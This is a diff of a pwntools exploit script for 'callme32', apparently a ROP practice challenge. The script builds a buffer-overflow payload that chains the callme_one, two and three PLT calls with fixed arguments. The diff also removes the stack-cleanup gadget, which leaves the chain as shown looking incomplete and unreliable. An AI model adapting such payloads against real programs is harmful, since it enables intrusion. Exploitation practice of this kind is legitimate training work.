@@ -12,19 +12,14 @@ c
 # Set up pwntools for the correct architecture
 elf =  ELF('callme32')
 context.binary=elf
+context(terminal=['tmux', 'split-window', '-h'])
 
-# Offset avant ecrasement de l'adresse de retour
+# Offset to return address
 offset=0x2c
 
 callme_one=elf.plt['callme_one']
 callme_two=elf.plt['callme_two']
 callme_three=elf.plt['callme_three']
-
-# Au choix
-# 0x080484aa : add esp, 8 ; pop ebx ; ret
-g_pop3ret=0x080484aa
-# 0x080487f9 :  pop esi ; pop edi ; pop ebp ; ret
-#g_pop3ret=0x080487f9
 
 io = process([elf.path])
 
@@ -40,6 +35,7 @@ log.info(f"{callme_three=:x}")
 
 PL =b"A"*offset
 PL+=p32(callme_one)
+PL+=p32(callme_two)
 PL+=p32(0xdeadbeef)
 PL+=p32(0xcafebabe)
 PL+=p32(0xd00df00d)
@@ -54,7 +50,7 @@ PL+=p32(0xdeadbeef)
 PL+=p32(0xcafebabe)
 PL+=p32(0xd00df00d)
 
-# affichage du prinf correspondant pour mise au point
+# print the payload corresponding printf to debug
 print("")
 print(f"printf %{offset}s"+''.join([ f"\\x{c:02x}" for c in PL[offset:]])+" A")
 print("")
